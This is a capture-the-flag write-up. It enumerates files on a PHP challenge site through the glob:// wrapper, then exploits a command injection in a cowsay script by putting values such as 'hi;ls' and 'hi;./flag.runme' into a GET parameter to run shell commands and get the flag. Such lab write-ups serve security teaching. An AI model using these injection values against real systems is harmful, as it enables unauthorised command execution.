# globglogabgalab 1

## Write-up

### 1. Filename enumeration

- Upon opening the website we can read the source code of the PHP script :

```php
<?php

error_reporting(0);

$output = null;

if (isset($_GET['dir'])) {
  $files = scandir($_GET['dir']);
  $output = ($files === false) ? "Error" : count($files)." files";
} else {
  highlight_file(__FILE__);
  exit;
}

?>

<!DOCTYPE html>
<html>
  <head>
    <title>Globglogabgalab</title>
  </head>
  <body>
    <p><?= htmlspecialchars($output) ?></p>
  </body>
</html>
```

- Basically the script expects a `dir` GET parameter that represents a directory, and returns the number of files in that directory

- For example, passing `.` as a directory returns "5 files", which means that the current directory contains 5 files (including `.` and `..`)

- But how can enumerate those files ? The answer is : [PHP wrappers](https://www.php.net/manual/en/wrappers.php)

- In our case, the most interesting wrapper is `glob://`, as it allows finding pathnames that match a pattern

- For example, by setting `dir` to `glob://*.php` to find all PHP files in current directory, the result returned is "2 files"

- In order to find all files in a certain directory, I wrote [this script here](brute.py)

- After running the script on the current directory `.`, we find 3 files : `index.php`, `cowsay.php`, `flag.runme`

- If we try to browse to `/flag.runme` we get a 403 forbidden error, which probably means that the file has execute permission only and we're supposed to run it after getting RCE

### 2. Getting RCE

- After browsing to `/cowsay.php` we can also read the source code of the script :

```php
<?php

error_reporting(0);

$output = null;

if (isset($_GET['message']) && is_string($_GET['message'])) {
  $cowacter = (isset($_GET['cowacter']) && is_string($_GET['cowacter'])) ? $_GET['cowacter'] : "default";
  $message = $_GET['message'];

  $output = shell_exec("/usr/games/cowsay -f ${cowacter} ${message}");
} else {
  highlight_file(__FILE__);
  exit;
}

?>

<!DOCTYPE html>
<html>
  <head>
    <title>Globglogabgalab</title>
  </head>
  <body>
    <pre><?= htmlspecialchars($output) ?></pre>
  </body>
</html>
```

- This line is the most interesting :

```php
<?php
// ...
$output = shell_exec("/usr/games/cowsay -f ${cowacter} ${message}");
// ...
?>
```

- Since we have total control over `cowacter` and `message` parameters, we can basically inject arbitrary commands

- By passing `cowacter=default` and `message=hi;ls`, we're able to execute the `ls` command :

```txt
 ____
< hi >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cowsay.php
flag.runme
index.php
```

- Let's execute `flag.runme` now, with `cowacter=default` and `message=hi;./flag.runme` :

```txt
 ____
< hi >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
shellmates{sHw4BbLE_daBblE_gl1Bbl3_GLaBbL3_SChr1bBLE_$HW4P_GlAB}
```

## Flag

`shellmates{sHw4BbLE_daBblE_gl1Bbl3_GLaBbL3_SChr1bBLE_$HW4P_GlAB}`
